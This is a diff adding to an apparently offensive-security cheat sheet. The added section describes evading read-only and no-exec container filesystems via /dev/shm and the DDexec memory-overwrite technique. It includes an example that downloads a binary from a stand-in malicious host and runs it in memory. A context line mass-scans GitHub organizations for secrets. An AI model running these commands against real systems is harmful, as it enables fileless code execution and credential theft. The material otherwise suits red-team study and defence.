@@ -1227,3 +1227,29 @@ Enumerate GitHub organizations for secrets and credentials
 ```console
 root@RoseSecurity# orgs=$(curl -s https://api.github.com/organizations | jq -r '.[] | .name'); for i in $orgs; do trufflehog github --org=$i; done
 ```
+
+## Bypass File System Protections (Read-Only and No-Exec) for Containers:
+
+It's increasingly common to find Linux machines mounted with read-only (ro) file system protection, especially in containers. This is because running a container with `ro` file system is as easy as setting `readOnlyRootFilesystem: true` in the `securitycontext`:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: victim-pod
+spec:
+  containers:
+  - name: alpine 
+    image: alpine
+    securityContext:
+      readOnlyRootFilesystem: true
+    command: ["sh", "-c", "while true; do echo 'RoseSecurity FTW'; done"]
+```
+
+However, even if the file system is mounted as `ro`, /dev/shm will still be writable, so it's fake we cannot write anything on the disk. However, this folder will be mounted with `no-exec` protection, so if you download a binary here you won't be able to execute it.
+
+[DDexec](https://github.com/arget13/DDexec) is a technique that allows you to modify the memory of your own process by overwriting its /proc/self/mem.
+```
+# Example
+wget -O- https://malicious.com/hacked.elf | base64 -w0 | bash ddexec.sh argv0 phone home
+```
